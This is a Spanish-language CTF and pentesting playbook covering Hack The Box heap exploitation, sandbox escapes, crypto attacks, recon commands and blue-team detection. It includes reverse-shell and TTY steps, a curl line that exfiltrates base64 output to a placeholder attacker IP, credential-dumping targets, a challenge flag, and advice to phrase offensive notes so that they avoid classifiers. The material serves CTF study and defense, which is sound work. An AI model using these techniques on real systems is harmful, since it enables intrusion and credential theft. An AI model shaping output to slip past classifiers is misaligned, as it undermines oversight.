- **Reverse shell:** listener (`nc -lvnp`/`pwncat-cs`/`rlwrap nc`) + callback del target. Catálogo: **revshells.com**. Si no hay conectividad de vuelta → **escribir tu clave SSH** en `~/.ssh/authorized_keys` (si el 22 es alcanzable) o exfil por callback HTTP (lo que usé en Nimbus).
- **Estabilizar TTY:** `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm`.
- **Exfil sin shell interactiva:** ejecutar comando, `base64` el output, mandarlo por `curl http://MI-IP/x?d=<b64>` a un listener propio (patrón robusto cuando el canal interactivo es frágil).
- **Cred harvesting:** Linux → `/etc/shadow`, `.bash_history`, claves SSH, `.env`, `config.php`. Windows/AD → `secretsdump`, `mimikatz`/`nanodump` (LSASS), SAM/SYSTEM hives, `lazagne`.

---

## 10. Explotación de binarios / heap pwn (Heapify ✅ RESUELTO · Blinded [parked])

| Tool | Para qué |
|---|---|
| **gdb + pwndbg** | heap/arena, breakpoints, `vmmap` |
| **pwntools** | scripting (`process`, `remote`, `p64`, `fit`, `ELF`, `ROP`) |
| **readelf/objdump/strings** | protecciones (RELRO/NX/PIE/canary), offsets de libc |
| **patchelf / ld.so runner** | correr el binario con su libc exacta |
| **one_gadget / ropper / ROPgadget** | magic gadgets / cadenas ROP |

Conceptos glibc 2.35: House of Water (sembrar `main_arena`), FSOP (`_IO_FILE`), offsets clave (`system`, `_IO_2_1_stdout_`, `_IO_list_all`, `__free_hook`). **Nicho de exploit-dev, no pentest diario** → prioridad web/AD.

### 🧨 Heap moderno SIN primitivo de leak/output (de Heapify — Insane ✅, glibc 2.35, PIE+FullRELRO+NX+Canary, sin hooks) — flag `HTB{dd148d2b41d538fa950eee1f6a1fa9ce}`

> Reto "min-heap de comandos sobre el heap". **No imprime NUNCA una dirección** y Full RELRO mata el GOT. La lección madre: **se puede derrotar ASLR y ganar RCE sin un solo primitivo de lectura**, convirtiendo al programa mismo en un **oráculo de comparación**. Cadena final `~/ctf/heapify/pwn_heapify/exploit/{hx.py,sploit.py}` (12/12 local, 1er intento remoto). Writeup: `Heapify.md`. Técnicas 100% reusables:

- **⚡ Refinamiento del oráculo — búsqueda por RANGO (no binaria).** En vez de 1 bit/query, meté *k* sondas por ronda que parten el intervalo en *k+1* → **log₂(k+1) bits/ronda** (con k=15 → ~4 bits). Desempate final con **1 sonda** (tie-free: `upheap` no swapea en empate → el target insertado 1ro queda en la raíz → `r==0 ⇔ target==sonda`). Recupera `heap_base` EXACTO buscando en `[0,2³⁶)` sin asumir bits altos del ASLR. Mismo esquema para libc en `[0,2⁴⁷)`.

- **🔑 Libc leak SIN OOB — `malloc_consolidate` + dispensador `last_remainder` (alternativa más simple al forge).** Llená N chunks 0x80 contiguos (7 tcache + ~22 fastbin adyacentes) y dispará **`malloc_consolidate`** mandando el `size` con **~70000 dígitos** (el `scanf` interno pide un `malloc` gigante). Los fastbins se **fusionan** en un chunk grande → **unsorted** → los `malloc` siguientes salen del split del `last_remainder` con `user[0] = &main_arena.bins[0]` = `libc+0x219ce0`. Mismo oráculo → libc base. No hace falta forjar `size` con la OOB.

- **🔑 `scanf("%zu")` con input NO numérico = leak gratis (no escribe el destino).** Por el estándar C, ante *matching failure* scanf **deja el argumento sin tocar**. Si el destino es un chunk recién liberado a tcache, su **`fd` safe-linked (`&fd>>12` en el 1er free de un bin vacío = `heap_base>>12`)** sobrevive ahí. Al reALOCAR ese chunk y mandar `"z"` como número → el chunk queda con **prioridad = `heap_base>>12`**. *(mandar la `"z"` SIN newline: el `getchar()` post-scanf se la come; con newline, el `fgets` de data lo desincroniza).* De-shifteás y tenés heap base. *Defensa:* chequear el valor de retorno de `scanf`; inicializar buffers; no reusar memoria sin limpiar.

- **🔑 Oráculo de COMPARACIÓN por orden-de-pop (leak binario sin output primitive).** El heap ordena por prioridad; al ejecutar, el `do_cmd` imprime distinto según el comando (`"flag"`→"Congratulations…" vs otro→"Invalid command!"). Para leakear un valor oculto `U` (una prioridad, ej. `heap>>12`): insertás el chunk-target con data `"flag"` y un chunk-probe con prioridad `P` y data distinta; **un `exec` popea el menor y su output te dice `U<P` o `U≥P`** = 1 bit. Binary-search sobre `P` → **~52 iteraciones/puntero**, sin format string ni read. *(Ojo tie-break: en `U==P` el orden lo decide la estructura del heap → la comparación efectiva puede ser `≤`; ajustar el retorno de la búsqueda).* Es EL patrón para leakear con solo un canal booleano observable. *Defensa:* no exponer diferencias observables de orden/tiempo sobre datos secretos.

- **🔑 OOB en sift-down de priority-queue.** El `downheap` chequea hoja con `slots[left]==0` (confía en el zero-fill de `calloc`) pero **NO** valida `left < count` → cuando un elemento se hunde a `idx≥32`, `left=2·idx+1≥63` lee/escribe **fuera del array**, en el chunk adyacente. El **swap** de downheap **escribe un valor 64-bit que vos controlás** (la prioridad del 1er chunk) en un slot in-bounds → **write primitive**. *(El deref del slot OOB necesita una dirección MAPEADA para no crashear — de ahí que el heap-leak vaya primero).* *Defensa:* validar SIEMPRE índices contra `count`, no confiar en centinelas de memoria.

- **🔑 Forjar un chunk falso al UNSORTED bin (leak de libc cuando `size` está capado ≤tcache).** Si el programa solo aloca chunks ≤0x80 (tcache/fastbin, `fd` safe-linked, cero libc), forjás un chunk falso: `*(F-8)=0x431` (size >0x410 = fuera de tcache, no fastbin → **unsorted**), un **fake-next** en `F+size` con `size=0x21` (prev_inuse SET → no double-free error), y **next-next** con prev_inuse SET (→ no forward-consolidate). `free(F)` pasa todos los checks de `_int_free` → cae al unsorted → **`F[0]=F[8]=main_arena`** (offset conocido a libc). Reusás `F` con scanf-fail → prioridad = puntero a libc → mismo oráculo → **libc base**. *Defensa:* heap con metadata fuera de banda; hardened_malloc.

- **🔑 Free ARBITRARIO por corrupción de slot + burbujeo a raíz.** El OOB-write pone `slots[32]=F` (F = userptr del chunk falso). `remove_min` solo popea la RAÍZ, así que F debe llegar a `slots[0]`: con `*F` = prioridad mínima, F **burbujea** a lo largo de los `exec` (y/o lo agarra el `slots[count]→raíz` cuando `count` baja). **Predecí el número EXACTO de execs con un simulador fiel** (mirror en Python de up/downheap): en Heapify, F sale en el **exec #44**. Cuando F es raíz → `remove_min`→`free(F)` = free de dirección arbitraria.

- **🔑 Bootstrap de integración (chicken-egg del OOB): truco reserve-chunk LIFO.** El OOB lee un slot que aliasa el chunk **físicamente pegado al struct** (dirección fija). Pero el heap-leak (destructivo) ensucia esa zona. Solución: creá ese chunk-target **PRIMERO con prioridad máxima única** → nunca lo popeás durante el leak → al drenar popea **último** → queda **cabeza de tcache** → se **realloca primero** en la misma dirección → ahí ponés tu `chunk0` con la prioridad mapeada que el OOB necesita.

- **🔑 Simulador fiel = arma de grooming.** Reimplementar en Python el `add_cmd`/`upheap`/`remove_min`/`downheap` EXACTOS (leídos del objdump, el binario suele tener símbolos) permite **calcular determinísticamente** qué orden de inserción hunde un elemento a `idx≥32`, y en qué `exec` se libera el chunk falso — sin adivinar en gdb. Validá el sim contra un crash conocido (core dump).

- **🔑 Grooming del OOB: usar POCOS elementos (34, no 63).** El hundimiento útil es a `idx=32`, pero con 63 elementos el sift-down sigue a hojas 38-61 = memoria NO controlada → crash. Con **34** elementos, tras el pop quedan 33 y el único nodo de nivel-5 alcanzable es el 32 (las demás ramas terminan en slot 0) → el OOB queda **dirigible**. El nº exacto de execs hasta `free(F)` sale del simulador (varía por groom; no es fijo). *Regla:* achicá el árbol hasta que solo el índice-objetivo sea alcanzable.

- **🔑 Endgame FSOP House of Apple 2 (Full RELRO + sin hooks 2.35).** tcache poison (`fd=(chunk>>12)^target`) → escribí **`_IO_list_all` = FILE falso** en el heap. `exit(1)` (gratis: opción de menú inválida `3`) → `_IO_flush_all` recorre la lista → `_IO_OVERFLOW`. FILE falso: `vtable=_IO_wfile_jumps` (válida, pasa `IO_validate_vtable`; su `__overflow`=`_IO_wfile_overflow`), `_wide_data=W`, `W->_wide_vtable=VT` (**no** validada), `VT->__doallocate=system`, `_IO_write_ptr(1)>_IO_write_base(0)`, `_mode=0`, `_lock`→zeros, `_chain=NULL`. Como `rdi`=FILE, `system(FILE)`=`system(_flags)`.
  - **⚠️⚠️ TRAMPA (me costó horas): `_flags` controla el flujo de `_IO_wfile_overflow` además de ser el arg de `system`.** `test al,0x8`(NO_WRITES), `test ah,0x8`(→0x800 CURRENTLY_PUTTING) y en `_IO_wdoallocbuf` `test _flags,0x2`(UNBUFFERED): si CUALQUIERA está puesto, **saltea `__doallocate`→no llama system, exit limpio sin shell**. Los 2 primeros bytes de `_flags` deben tener limpios **0x2, 0x8, 0x800**. `" /bin/sh"` **FALLA** (`/`=0x2f tiene bit 0x8→0x800). Usar **`"AA;/bin/sh"`** (`'A'`=0x41 cumple los 3; `sh -c` corre `AA` fallido y luego `/bin/sh`). Cuando el FILE está perfecto pero no dispara → sospechá SIEMPRE de los bits bajos de `_flags` primero.
  - *Alternativa:* hijack del resolver `ld.so dso_find_for_object` (= Blinded). *Defensa:* `_FORTIFY`, CET, y que la vtable ancha también se valide.

- **Debug headless:** `patchelf` para correr con la libc/ld exactas standalone (símbolos + libc correcta), `gdb -nx -batch -x script.gdb` (evita gdbinit roto), y leer `/proc/pid/mem` desde pwntools para inspeccionar heap sin plugins. Medir entropía ASLR real (heap ~30bit, libc ~44bit) para decidir si un oráculo mapped/unmapped es viable o hace falta el value-oracle exacto.

### VM / sandbox-escape pwn (de Sandcastle — Insane, clubby789)

Patrón "custom language / sandbox locked-down": te dan un intérprete (VM tipo Brainfuck, o bytecode) que corre tu programa con ops restringidas (FS/EXEC jaildeadas). El escape sale de un bug en la VM o en el sandbox. Técnicas clave:

- **Reversear la VM sin símbolos:** ubicar `main` (via `_start`→`__libc_start_main`), el **jump table de opcodes** (`lea rax,[rip+off]#tabla; mov eax,[tabla+op*4]; add rax,tabla; jmp rax`), y el fetch/decode. Los strings de debug (`SP/IP/STACK/Instruction`) y de error revelan la arquitectura.
- **Arquitectura broker + workers seccomp:** el proceso privilegiado (padre) atiende requests de los workers sandboxeados (hijos forkeados) por **pipes** + **memoria `MAP_SHARED`**. Cada worker tiene su propio filtro seccomp. Buscar la separación de privilegios y dónde se cruzan.
- **`open()` vs `popen()` differential:** un allow-list que valida un string como **path de archivo** (`open`+chequeo de MD5/hash) pero lo ejecuta como **comando de shell** (`popen`) → inyección. El bypass: crear/hacer que exista un archivo con el hash correcto pero **nombre que el shell parsea como 2 comandos**.
- **Bypass de sanitizador de paths que borra `/` y `.`:** meter el `/` recién en tiempo de shell con **`${PATH:0:1}`** (= primer char de `$PATH` = `/`), o `$(printf ...)`, etc. — sin `/` literal en el string.
- **Puntero de VM sin bounds-check = arbitrary R/W:** si los opcodes de mover-puntero no validan límites, `mem[base+ptr]` con `ptr` controlado = read/write arbitrario relativo a una base fija (útil con No-PIE). Con una op de OUTPUT tenés **leak** (leer GOT resuelto → libc; leer canary) → ROP.
- **Cuidado con el directorio:** las ops FS suelen operar en el `cwd`, mientras el EXEC puede prependear `../` — verificar que el archivo que creás caiga donde el chequeo lo busca.

### 🧩 Reversing: devirtualización de VM + MBA (de Callfuscated — Insane)

Patrón "crackme ofuscado a muerte": **call-obfuscation** (cada instr envuelta en `call`+`pop r8`+junk) + **VM** (intérprete de bytecode) + **MBA** (aritmética mixta) + **opaque predicates/junk**. La clave: **atacar la abstracción correcta con análisis DINÁMICO**, no pelear el asm estático.

- **Regla de oro:** contra call-obfuscation/instrucciones solapadas, el disasm lineal miente. **Single-step en orden de EJECUCIÓN** (gdb `stepi`) desenreda el flujo real.
- **No-PIE = regalo:** direcciones fijas → breakpoints e instrumentación triviales. Chequear `readelf -h` (Type EXEC vs DYN).
- **`srand()` con seed fijo (sin `time` importado) = fatal:** reimplementá glibc `rand()` (TYPE_3: `r[i]=(r[i-31]+r[i-3]); out=r[i]>>1`) y reproducís el keystream. PRNG no-cripto nunca es secreto.
- **Devirtualizar una VM sin símbolos:** ubicá el **dispatch** (`opcode=code[pc]`, cadena `cmp eax,N`/jump-table) y el **estado en el frame** (PC, SP, array de bytecode, stack de datos — todos `[rbp-off]`). Trazá **un hit por instrucción VM** (breakpoint en la cabeza del loop) y deducí cada opcode por su **efecto en el stack** (`PUSH/LOAD/MUL/XOR/SUB/OR…`). No necesitás entender la MBA: observás operandos→resultado.
- **MBA:** una op simple (`a^b`) reescrita como polinomio lineal con constantes mágicas (`imul 0xNNNN`, `not`, `and`). Ataque: **black-box** (operandos conocidos → salida) o simplificadores (SiMBA/msynth/Z3). En crackme instrumentable, black-box gana.
- **Control-flow input-independiente = oro:** si el nº de instrucciones/rand-calls no depende del input (sin early-exit), TODO lo que no sea el input es **constante capturable** (keystream, targets). Capturás con una corrida concreta y despejás el input.
- **gdb Python API** (`gdb.Breakpoint`, `parse_and_eval`, `stepi`) para instrumentar sin símbolos; correr headless con `gdb -nx -batch -x script.gdb` (el `-nx` evita gdbinit roto).
- **angr:** útil pero **muere con MBA** (expresiones gigantes) aunque el path sea único. Orden correcto: **devirtualizar primero**, angr después sobre el IR limpio (o hookear las funciones MBA a su op simple). No tirar angr ciego a un binario MBA-pesado.
- **Toolkit rev:** `objdump -d -M intel`, `readelf -S/-h/-d`, `gdb`(+pwndbg), `strings`, `python3` (reimplementar PRNG/VM), `z3`/`angr` si hace falta. Instalar: `pip install --break-system-packages angr z3-solver`.

### 🦜 Reversing multi-arch SIN qemu ni sudo (de Poly — Insane, jb0)

Cuando el binario es de otra arquitectura (ARM64/MIPS/…) y **no podés instalar qemu** (kali de Juan = sudo con password, cuelga headless):

- **Emular con Unicorn** (motor de qemu como lib Python, viene con angr): mapeás los segmentos LOAD, seteás SP, y hookeás `UC_HOOK_INTR` para implementar syscalls vos (`svc`): read=inyectar input, write=capturar stdout, exit=parar, open/mmap/brk=stubs. Corre self-modifying nativo, rapidísimo, computa hashes/CRC reales. Es LA forma de "correr" un ARM64 sin binfmt/root. Números de syscall ARM64: read=63, write=64, openat=56, close=57, exit_group=94, brk=214, mmap=222 (nº en `x8`, args `x0-x5`, ret en `x0`).
- **Desensamblar ARM64 con capstone** (`Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)`) cuando no hay `aarch64-linux-gnu-objdump`. Ojo: instrucciones 4-byte alineadas; si hay data embebida (magic, punteros) el linear-sweep se desincroniza → usar `skipdata=True` y realinear.
- **Reconocer primitivas cripto por sus CONSTANTES** (más rápido que reversar el algoritmo): **MD5** IV = `0x67452301 0xefcdab89 0x98badcfe 0x10325476` · **SHA1** IV = `…0x67452301…0xC3D2E1F0` · **SHA256** IV = `0x6a09e667…` · **CRC32** = loop `lsl #8 / lsr #24 / eor tabla[]` (poly 0xedb88320) · **AES** = S-box (`0x63,0x7c,0x77,0x7b…`).
- **`srand()`/PRNG sin `time` importado = determinista** → reproducir en Python y romper (ver Callfuscated).

### ⚠️ Decoys / defensa por engaño (lección de Poly)

- **Password plantado en rockyou = trampa.** Si un Insane se "resuelve" crackeando un hash con rockyou y sale fácil → sospechá. Poly plantó `il0vep0lly` que pasa el MD5-check pero lleva a *"nice try md5 cracker! …Go back to the start!"*. El flag real estaba escondido en otro lado (el banner). Regla del PLAYBOOK: **camino demasiado fácil = probablemente NO es el intended.**
- **Data gigante de alta entropía (ej. `.flag` 236KB) suele ser RUIDO** para distraer/inflar. Verificá con Hamming normalizado: ~4.0/byte = random (no es XOR de texto). No pierdas tiempo rompiéndola.
- **Multi-key XOR estego:** un mismo buffer puede tener 2+ mensajes con keys distintas (uno visible, el flag oculto). Si el binario descifra un buffer y solo imprime parte, bruteforceá el resto del buffer con otras keys buscando `HTB{`.

---

## 10c. 🔐 Crypto — ataques clásicos de CTF (de Wonky AES + genéricos)

> Categoría con poca práctica hasta ahora. Base para arrancar cualquier crypto: **mirá QUÉ te dan** (¿oráculo? ¿pares? ¿nonce? ¿parámetros raros?) — el bug suele estar en el *uso*, no en el algoritmo.

### 🩹 Fault attacks / DFA (de Wonky AES)

**Differential Fault Analysis sobre AES-128** (Piret-Quisquater). Aplica cuando podés obtener, para el **mismo plaintext**, la cifra **correcta** y una **con 1 byte corrompido** en una ronda tardía.

- **Modelo:** fault de 1 byte en **ronda 9, post-ShiftRows / pre-MixColumns** → tras MixColumns esparce a **1 columna** con patrón `(2δ, δ, δ, 3δ)`; ronda 10 lo permuta a una **diagonal** de 4 bytes en el ciphertext.
- **Recuperación:** por par, los 4 bytes que difieren = qué columna se faulteó. Se plantea `InvSBox(C_i ⊕ K_i) ⊕ InvSBox(C*_i ⊕ K_i) = coef·δ` y se prueban (4 filas × 255 δ × 256 K). **~2 pares por columna → 4 bytes de K10 únicos**; 4 columnas → **K10 completa**.
- **K10 → key maestra:** el key schedule de AES es **invertible** (recorrer para atrás `w[i-4]=w[i]⊕temp(w[i-1])`). Luego AES-decrypt del flag.
- **Metodología:** implementar AES propio con hook de fault + **self-test local** (recuperar una key random + verificar vector NIST) ANTES de tocar el target. Tool self-contained en `WonkyAES.md`. Otros modelos DFA: fault en ronda 8 (ataque de 2 fallos que recupera toda la key), fault en la key schedule.
- **Defensa:** no exponer salidas faulty; doble cómputo + comparación; sensores anti-glitch (voltaje/clock/láser).

### 🧮 Checklist genérico de crypto CTF (por si el reto es otro)

| Pista en el reto | Ataque probable |
|---|---|
| **RSA** con `e=3` / mensaje corto | cube-root / Håstad (broadcast) |
| **RSA** `n` factorizable (FactorDB, Fermat si p≈q, primos cercanos) | factorizar → φ → d |
| **RSA** mismo `n`, dos `e` coprimos | common modulus |
| **RSA** leak de `d` parcial / `dp,dq` | Coppersmith / CRT recovery |
| **AES-ECB** (bloques iguros ⇒ patrón) | ECB byte-at-a-time / cut-and-paste |
| **AES-CBC** + error de padding distinguible | **padding oracle** (decrypt/forge) |
| **CBC** con IV = key, o IV fijo | recuperar IV/plaintext, bit-flipping |
| **CTR/GCM nonce reutilizado** | keystream reuse / forjar tag (nonce-reuse) |
| **Stream/OTP key reusada** | XOR de cifrados → crib-dragging |
| **Fault / glitch** disponible | **DFA** (arriba) |
| **PRNG** (`rand()`, Mersenne, LCG) predecible | reconstruir estado → predecir (ver PRNG en §10) |
| **ECDSA/DSA** nonce `k` reutilizado o sesgado | recuperar clave privada (lattice/HNP) |
| **Hash length-extension** (MAC = H(secret‖msg)) | `hashpump` / forjar |

**Toolkit crypto:** `python3` + **pycryptodome**, **SageMath** (lattices/Coppersmith/curvas), **z3**, `sympy`, `gmpy2`, **RsaCtfTool**, FactorDB, `hashpump`. Instalar: `pip install --break-system-packages pycryptodome gmpy2 sympy z3-solver`.

---

## 11. Mapa técnica → box (de un vistazo)

```
RESIZER   (Hard, web)     path traversal → arbitrary write → shadow .so → RCE (worker reboot)
NIMBUS    (Hard, cloud)   vhost-enum → SSRF (bypass IP decimal) → IMDS creds → SQS YAML deser → RCE
                          → LocalStack directo :4566 (sin IAM) → CodeBuild → root
ARTIFICIALUNIVERSITY      checkout unauth (precio arbitrario) → bot admin → path-traversal →
  (Insane, web)           view-pdf same-origin → CVE-2024-4367 (pdf.js/FF125) → JS en origen admin →
                          form POST top-level (bypass SameSite) → curl 7.70.0 GOPHER → gRPC
                          DebugService (prototype-pollution __dict__) → eval() → RCE root → exfil flag
SANDCASTLE (Insane, pwn)  VM Brainfuck (broker+workers seccomp) → arbitrary write (ptr sin bounds)
                          → open vs popen differential → popen prefix-bypass → flag
CALLFUSCATED (Insane rev) call-obf + VM bytecode + MBA → devirtualizar dinámico (gdb API) → keystream
WONKY AES (crypto)        DFA/fault injection: pares correcto+faulty (fault ronda 9) → recuperar K10
                          por diferencial → invertir key schedule → key maestra → decrypt flag
POLY      (Insane, rev)   ARM64, decoys multicapa, /dev/null truco (fd 3) [en progreso]
BLINDED   (Insane, pwn)   House of Water → [pendiente FSOP]   [parked]
```

---

## 12. Cheatsheet de arranque

```bash
# 1. Puertos
nmap -p- --min-rate 3000 -T4 -Pn -n $IP -oG allports.gnmap
nmap -sVC -p<abiertos> -Pn -n $IP -oN services.txt
# 2. /etc/hosts si redirige
echo "$IP  dominio.htb" | sudo tee -a /etc/hosts
# 3. ★ VHOSTS (nunca saltar)
BASE=$(curl -s -H "Host: nope.dominio.htb" http://$IP/ | wc -c)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u http://$IP/ -H "Host: FUZZ.dominio.htb" -fs $BASE
# 4. Dirs
feroxbuster -u http://dominio.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# 5. Si hay Windows/AD:
nxc smb $IP -u '' -p '' --shares ; enum4linux-ng $IP
# 6. Si hay cloud/AWS mock:
aws --endpoint-url http://aws.dominio.htb sts get-caller-identity
```

---

## 13. Recordatorios de método (de cagadas reales)

1. **Vhost-enum SIEMPRE** antes de explotar profundo. (Perdí Nimbus por saltarlo.)
2. **Camino "imposible" = probablemente NO es el intended** → re-enumerar, no insistir.
3. **App single-threaded + fetch sin timeout = self-DoS.** Una request a la vez, espaciada; en box fresco esperar que el backend levante antes de tirar SSRF.
4. **El control de acceso puede estar en el proxy, no en el servicio** — buscar el backend "crudo" (ej. LocalStack `:4566` directo) que suele venir sin ese control.
5. **Documentar ofensiva con marco educativo** (payload + mitigación al lado), sin volcar tooling crudo en bloque (gatilla clasificadores y quema tokens).


---

## 14. 🛡️ Blue Team — detección y detection engineering

> Corazón del material del grupo. Todo ataque acá listado se practica **solo en lab propio / HTB / engagement con permiso escrito**. La lógica es *purple*: cada técnica ofensiva lleva su gemelo defensivo (Event ID + ATT&CK + mitigación). Un ataque que no genera evidencia es un ataque que no aprendiste a detectar.

---

##### 1. Catálogo de Event IDs (Windows Security + servicios)

Los IDs de `Security` requieren tener prendida la subcategoría de auditoría correcta (ver §5). "Delata" = qué patrón te hace sospechar, no que el ID solo ya sea malicioso.

| Event ID | Log / Fuente | Qué registra | Qué ataque delata |
|---|---|---|---|
| 4768 | Security (DC) | TGT solicitado (AS-REQ) | AS-REP Roasting (cuentas con `DONT_REQ_PREAUTH`), spray inicial; `Ticket Encryption Type 0x17` (RC4) = downgrade sospechoso |
| 4769 | Security (DC) | TGS solicitado (service ticket) | **Kerberoasting** — pico de 4769 con `Encryption Type 0x17` contra muchos SPN desde un host |
| 4624 | Security | Logon exitoso | Pass-the-Hash / PtT (Logon Type 3 + NTLM), movimiento lateral, uso de honey user |
| 4625 | Security | Logon fallido | Password spraying / brute force (muchos 4625 `0xC000006A` distribuidos en el tiempo) |
| 4648 | Security | Logon con credenciales explícitas (runas) | Uso de creds robadas, PtH con `sekurlsa`, lateral con distinto usuario |
| 4662 | Security | Operación sobre objeto AD (requiere SACL) | **DCSync** — `Replicating Directory Changes` (GUID `1131f6aa-...` / `1131f6ad-...`) desde host no-DC |
| 4672 | Security | Privilegios especiales asignados al logon | Logon de cuenta con privilegios altos; útil como baseline de admins y para spotear honey admin usado |
| 4720 | Security | Cuenta de usuario creada | Persistencia — creación de cuenta rogue |
| 4724 | Security | Reseteo de password de otra cuenta | Toma de control de cuenta, abuso de `ForceChangePassword` (ACL) |
| 4728 | Security | Miembro agregado a grupo global con seguridad | Escalada — usuario metido en Domain Admins u otro grupo priv |
| 4738 | Security | Cuenta de usuario modificada | Cambios de UAC flags (ej. setear `DONT_REQ_PREAUTH` para AS-REP roast, o SPN para targeted Kerberoast) |
| 4732 | Security | Miembro agregado a grupo local con seguridad | Escalada local (ej. a Administrators de un host) — *complementa 4728* |
| 5136 | Security (DS) | Objeto del directorio modificado (requiere auditoría DS Changes) | Abuso de ACL/DACL, escritura de `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD), `nTSecurityDescriptor` |
| 5140 | Security | Acceso a un share de red | Acceso a `SYSVOL`/`NETLOGON`/shares sensibles, recon de shares |
| 5145 | Security | Chequeo detallado de acceso a share (nivel archivo) | Lateral movement por SMB, acceso a `\ADMIN$`/`\C$`, SMB relay landing |
| 4886 / 4887 | Security (AD CS) | Solicitud (4886) y emisión (4887) de certificado por la CA | **AD CS / ESC** — request de cert con SAN alterno = ESC1/ESC6; correlacionar con la plantilla usada |
| 7045 | System | Servicio nuevo instalado | **PsExec / SMBexec / Cobalt Strike** — servicio efímero con nombre random; ejecución remota como SYSTEM |
| 1102 | Security | El log de auditoría fue limpiado | **Defense Evasion** — borrado de logs, casi siempre alerta crítica |

> Complementos frecuentes fuera de la lista pedida: **4776** (validación de credencial NTLM en DC — spray NTLM), **4698** (tarea programada creada — persistencia), **4104** (ScriptBlock logging de PowerShell — payloads ofuscados). Los dejo como *nice-to-have*.

---

##### 2. Sigma — regla de detección portable

**Qué es:** formato abierto en YAML para escribir reglas de detección **agnósticas del SIEM**. Escribís la lógica una vez y la "compilás" a la query de tu backend (Splunk SPL, Elastic/ES|QL, Wazuh, Sentinel KQL, etc.). Repo canónico: **SigmaHQ** (`github.com/SigmaHQ/sigma`), con miles de reglas ya escritas.

**Estructura mínima de una regla:**

| Campo | Función |
|---|---|
| `title` / `id` / `status` | Nombre, UUID, madurez (`experimental`/`stable`) |
| `logsource` | `product` (windows), `service` (security), `category` |
| `detection` | Uno o más `selection` (los match) + `condition` (cómo se combinan) |
| `falsepositives` | FPs conocidos (honestidad = menos ruido) |
| `level` | `low` → `critical` |
| `tags` | Mapeo a ATT&CK (`attack.credential_access`, `attack.t1558.003`) |

Ejemplo conceptual de la sección clave (Kerberoasting):
`detection: selection: {EventID: 4769, TicketEncryptionType: '0x17'}  filter: {ServiceName: 'krbtgt'}  condition: selection and not filter`

**Conversión** con `sigma-cli` (motor **pySigma**):
`sigma convert -t splunk -p splunk_windows regla.yml`  → cambiás `-t` por `elasticsearch`, `wazuh`, `esql`, etc. Los `-p` son *pipelines* que traducen los nombres de campo a los de tu fuente (Sysmon, Windows Security, ECS…).

---

##### 3. MITRE ATT&CK — el mapa común

**Qué es:** base de conocimiento de **tácticas** (el *por qué*: Credential Access, Lateral Movement…) y **técnicas** (el *cómo*: Txxxx, con sub-técnicas Txxxx.00x). Es el idioma compartido entre red y blue.

**Cómo mapear tus detecciones:**
1. Por cada regla/alerta, etiquetá la técnica (ej. Kerberoasting = **T1558.003**).
2. Volcá tu cobertura en el **ATT&CK Navigator** (matriz web coloreable) — pintás verde lo que detectás, rojo los huecos. Exportás a JSON y lo versionás.
3. El heatmap resultante = tu roadmap de detection engineering y una diapositiva perfecta para mostrar cobertura.

| Táctica (ejemplos del lab) | Técnica | ID |
|---|---|---|
| Credential Access | Kerberoasting | T1558.003 |
| Credential Access | AS-REP Roasting | T1558.004 |
| Credential Access | OS Credential Dumping: DCSync | T1003.006 |
| Lateral Movement | Pass-the-Hash | T1550.002 |
| Lateral Movement | Pass-the-Ticket | T1550.003 |
| Execution / Lateral | Service Execution (PsExec) | T1569.002 |
| Persistence / Priv Esc | Valid Accounts | T1078 |
| Persistence / Priv Esc | Account Manipulation (abuso de ACL/DACL, RBCD) | T1098 |
| Defense Evasion | Clear Windows Event Logs | T1070.001 |

> Nota de mapeo: **T1484** (Domain Policy Modification) cubre abuso de **GPO** y de trusts de dominio, *no* la modificación de DACLs sobre objetos AD. Por eso el abuso de ACL/RBCD se mapea a **T1098 (Account Manipulation)**, no a T1484. Reservá T1484 para cuando el vector real sea manipulación de GPO.

---

##### 4. Honeytokens & deception — detección de altísima fidelidad

La ventaja: un objeto señuelo **no tiene uso legítimo**, así que *cualquier* interacción es señal casi sin falsos positivos.

| Señuelo | Cómo se arma (herramienta real) | Qué dispara | Detección |
|---|---|---|---|
| **Honey SPN / Kerberoast bait** | Cuenta común (no privilegiada, pwd fuerte y larga) con un `servicePrincipalName` falso (ej. `MSSQLSvc/fake.corp:1433`). Nadie debería pedir su TGS jamás | Cualquier **4769** contra ese SPN = alguien está kerberoasteando el dominio | Alerta directa por ServiceName == SPN señuelo. Fidelidad altísima |
| **Honey user en grupo privilegiado** | Cuenta atractiva ("`svc_backup_adm`") en un grupo priv, con logon denegado en todos lados y monitoreada | Enumeración (BloodHound la marca como path) y todo **4624/4625/4768** con ese sAMAccountName | Logon o TGT de esa cuenta = compromiso confirmado |
| **Credenciales señuelo (canarytokens)** | **Canarytokens** (thinkst, gratis): tokens tipo AWS keys, docs Office, URLs, entradas de `web.config` sembradas en shares/LSASS-bait | Uso del token (ej. la AWS key falsa usada, el doc abierto) | Alerta out-of-band al mail/webhook que configuraste |
| **Deception a nivel objeto AD** | Cuentas señuelo creadas con tooling AD estándar (`New-ADUser` / `Set-ADUser`), monitoreadas. **DSInternals** sirve para *auditar* el AD DB (`Get-ADReplAccount` = lectura por replicación, equivalente a un DCSync; cmdlets `Set-ADDB*` offline para atributos realistas) — no para "sembrar" objetos en caliente | Recon/uso de esas cuentas | Correlación en SIEM |
| **Deception gestionada** | **Microsoft Defender for Identity** (deceptions nativas: honeytoken accounts marcadas) — sensor en el DC | Interacción con la cuenta honeytoken | Alerta en el portal de MDI |

> Regla de oro del honey SPN: el password del bait debe ser **fuerte** (25+ chars aleatorios). No querés que además de detectar, el atacante crackee el TGS offline y tenga una cuenta real.

---

##### 5. Stack de detección casero (lab de bajo costo)

| Capa | Herramienta | Qué prender / clave |
|---|---|---|
| **Telemetría de endpoint** | **Sysmon** (Sysinternals) con config **SwiftOnSecurity** u **Olaf Hartong (sysmon-modular)** | IDs clave: **1** ProcessCreate, **3** NetworkConnect, **7** ImageLoad, **8** CreateRemoteThread, **10** ProcessAccess (LSASS!), **11** FileCreate, **13** RegistrySet, **22** DNSQuery |
